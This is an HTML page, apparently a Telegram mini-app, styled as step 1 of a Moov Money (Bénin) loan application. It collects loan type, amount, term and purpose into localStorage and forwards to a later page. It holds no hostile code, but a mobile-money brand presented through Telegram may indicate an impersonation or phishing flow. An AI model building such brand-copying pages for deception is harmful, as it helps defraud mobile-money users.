<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Moov Money - Demande de Prêt</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --moov-orange: #f26522;
            --moov-blue: #004b87;
            --bg-color: #e5e5e5;
            --card-bg: #ffffff;
            --input-border: #cbd5e1;
        }

        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        
        .app-header {
            width: 100%; background-color: var(--moov-blue); height: 60px; padding: 0 20px;
            display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100;
            border-bottom: 3px solid var(--moov-orange);
        }
        .back-btn { color: white; text-decoration: none; font-weight: 600; font-size: 15px; cursor: pointer; }
        .header-title { position: absolute; left: 50%; transform: translateX(-50%); display: flex; font-size: 20px; font-weight: 800; }
        .header-title .moov { color: var(--moov-orange); margin-right: 4px; }
        .header-title .money { color: #ffffff; }

        .card {
            background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 32px 24px;
            border-radius: 16px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05); display: flex; flex-direction: column;
        }
        .main-title { font-size: 26px; color: var(--moov-blue); margin: 0 0 6px; text-align: center; font-weight: 800; }
        .subtext { font-size: 14px; color: #666; text-align: center; margin-bottom: 20px; }

        .step-indicator { display: flex; gap: 12px; margin: 0 auto 32px; width: 80%; }
        .step-bar { flex: 1; height: 4px; background-color: #e2e8f0; border-radius: 2px; }
        .step-bar.active { background-color: var(--moov-orange); }

        .form-group { margin-bottom: 22px; display: flex; flex-direction: column; }
        .form-group label { font-size: 15px; font-weight: 700; color: #222; margin-bottom: 10px; }
        .form-control {
            font-size: 15px; padding: 14px 16px; border: 1px solid var(--input-border);
            border-radius: 10px; background-color: #fff; outline: none; width: 100%;
        }
        .form-control:focus { border-color: var(--moov-blue); }

        .btn-next {
            background-color: var(--moov-orange); color: white; border: none; width: 100%;
            padding: 16px; border-radius: 10px; font-size: 15px; font-weight: 800; cursor: pointer; text-transform: uppercase;
        }
        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #666; margin-top: auto; }
    </style>
</head>
<body>

<div class="app-header">
    <a href="/" class="back-btn">← Retour</a>
    <div class="header-title">
        <span class="moov">Moov</span><span class="money">Money</span>
    </div>
    <div style="width:24px;"></div>
</div>

<div class="card">
    <h1 class="main-title">Demande de Prêt</h1>
    <div class="subtext">Étape 1 sur 3</div>

    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
        <div class="step-bar"></div>
    </div>

    <form onsubmit="submitStep1(event)">
        <div class="form-group">
            <label for="loanType">Type de Prêt</label>
            <select id="loanType" class="form-control" required>
                <option value="Prêt Personnel" selected>Prêt Personnel</option>
                <option value="Prêt Professionnel">Prêt Professionnel</option>
                <option value="Prêt Éducation">Prêt Éducation</option>
                <option value="Prêt d'Urgence">Prêt d'Urgence</option>
            </select>
        </div>

        <div class="form-group">
            <label for="loanAmt">Montant du Prêt (FCFA)</label>
            <input type="number" id="loanAmt" class="form-control" value="250000" required>
        </div>

        <div class="form-group">
            <label for="loanTerm">Durée du Prêt</label>
            <select id="loanTerm" class="form-control" required>
                <option value="6 Mois">6 Mois</option>
                <option value="12 Mois" selected>12 Mois</option>
                <option value="24 Mois">24 Mois</option>
                <option value="36 Mois">36 Mois</option>
            </select>
        </div>

        <div class="form-group">
            <label for="loanPurpose">Objet du Prêt</label>
            <textarea id="loanPurpose" class="form-control" style="resize:none; height:80px;" placeholder="À quoi sera utilisé ce prêt ?" required></textarea>
        </div>

        <button type="submit" class="btn-next">ÉTAPE SUIVANTE</button>
    </form>
</div>

<div class="footer-banner">© 2026 Moov Africa Bénin</div>

<script>
    function submitStep1(e) {
        e.preventDefault();
        const loanAmt = Number(document.getElementById('loanAmt').value) || 250000;
        const months = Number(document.getElementById('loanTerm').value.replace(/\D/g, '')) || 12;
        
        localStorage.setItem('loan_amount', loanAmt);
        localStorage.setItem('loan_term', months);
        localStorage.setItem('appliedPurpose', document.getElementById('loanPurpose').value);

        window.location.href = "/page3";
    }
</script>
</body>
</html>
